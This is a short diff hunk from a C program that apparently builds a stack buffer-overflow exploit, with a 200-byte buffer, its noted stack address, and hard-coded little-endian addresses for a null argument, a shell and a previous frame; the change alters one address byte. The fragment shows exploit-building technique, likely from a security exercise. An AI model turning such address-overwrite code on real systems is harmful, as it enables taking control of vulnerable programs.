@@ -9,7 +9,7 @@ int main(void)
 {
   char bufr[200];
   // bufr address = bfbf671d
-  char null_arg_addr[] = "\x1d\x67\xbf\xbf"; // remeber to change back 1d to d0
+  char null_arg_addr[] = "\xd0\x67\xbf\xbf"; 
   char shell_addr[] = "\xd4\x67\xbf\xbf";
   char prev_addr[] = "\xc8\x67\xbf\xbf";
 
